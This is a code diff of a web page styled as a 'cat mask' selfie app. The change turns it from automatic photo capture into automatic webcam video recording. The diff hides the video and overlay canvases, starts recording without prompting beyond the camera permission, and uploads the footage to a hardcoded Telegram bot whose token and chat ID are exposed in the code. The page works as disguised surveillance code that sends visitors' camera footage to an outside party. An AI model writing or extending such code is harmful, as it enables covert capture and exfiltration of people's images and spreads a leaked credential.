@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Selfie with Cat Mask to Telegram</title>
+    <title>Video Recording with Cat Mask to Telegram</title>
     <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
     <style>
-        #video, #canvas {
+        #video, #canvas, #overlayCanvas {
             display: none;
         }
         #overlayCanvas {
@@ -17,10 +17,11 @@
     </style>
 </head>
 <body>
-    <h1>Selfie App with Cat Mask</h1>
+    <h1>Video Recording with Cat Mask</h1>
     <video id="video" width="640" height="480" autoplay></video>
     <canvas id="canvas" width="640" height="480"></canvas>
     <canvas id="overlayCanvas" width="640" height="480"></canvas>
+    <button id="stopButton">Stop Recording</button>
 
     <script>
         const video = document.getElementById('video');
@@ -28,8 +29,12 @@
         const overlayCanvas = document.getElementById('overlayCanvas');
         const context = canvas.getContext('2d');
         const overlayContext = overlayCanvas.getContext('2d');
+        const stopButton = document.getElementById('stopButton');
 
-        // Load the models for face detection
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        // Load face-api models
         Promise.all([
             faceapi.nets.tinyFaceDetector.loadFromUri('/models'),
             faceapi.nets.faceLandmark68Net.loadFromUri('/models')
@@ -39,21 +44,42 @@
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
                     video.srcObject = stream;
+                    setupMediaRecorder(stream);
 
                     video.onloadedmetadata = () => {
-                        setTimeout(async () => {
+                        // Detect faces and draw mask every frame
+                        setInterval(async () => {
                             const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks();
-
                             if (detections.length > 0) {
                                 drawCatMask(detections[0].landmarks);
                             }
+                        }, 100); // Detect every 100ms
 
-                            context.drawImage(video, 0, 0, 640, 480);
-                            sendToTelegram(canvas.toDataURL('image/png'));
-                        }, 3000); // Delay for camera to focus
+                        // Start recording after video is ready
+                        setTimeout(() => {
+                            mediaRecorder.start();
+                            console.log('Recording started');
+                        }, 3000); // Delay to allow camera to focus
                     };
                 })
                 .catch(err => console.error("Error accessing camera: ", err));
+        }
+
+        function setupMediaRecorder(stream) {
+            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    recordedChunks.push(event.data);
+                }
+            };
+
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                const videoURL = URL.createObjectURL(blob);
+                console.log('Recording stopped. Sending video...');
+                sendToTelegram(blob);
+            };
         }
 
         function drawCatMask(landmarks) {
@@ -71,34 +97,36 @@
             };
         }
 
-        function sendToTelegram(imageData) {
+        function sendToTelegram(blob) {
             const token = '7504272107:AAH8rOfaUtOq8xnxWnvQ0s4SriLHkz4nITk';
             const chatId = '6121166273';
-            const url = `https://api.telegram.org/bot${token}/sendPhoto`;
+            const url = `https://api.telegram.org/bot${token}/sendVideo`;
 
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('photo', dataURItoBlob(imageData), 'selfie.png');
+            formData.append('video', blob, 'recording.webm');
 
             fetch(url, {
                 method: 'POST',
                 body: formData
             })
             .then(response => response.json())
-            .then(data => console.log('Success:', data))
-            .catch((error) => console.error('Error sending to Telegram:', error));
+            .then(data => {
+                if (data.ok) {
+                    console.log('Video sent successfully:', data);
+                } else {
+                    console.error('Telegram API error:', data.description);
+                }
+            })
+            .catch((error) => console.error('Error sending video to Telegram:', error));
         }
 
-        function dataURItoBlob(dataURI) {
-            let byteString = atob(dataURI.split(',')[1]);
-            let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-            let ab = new ArrayBuffer(byteString.length);
-            let ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
+        stopButton.addEventListener('click', () => {
+            if (mediaRecorder) {
+                mediaRecorder.stop();
+                console.log('Recording stopped');
             }
-            return new Blob([ab], {type: mimeString});
-        }
+        });
     </script>
 </body>
 </html>
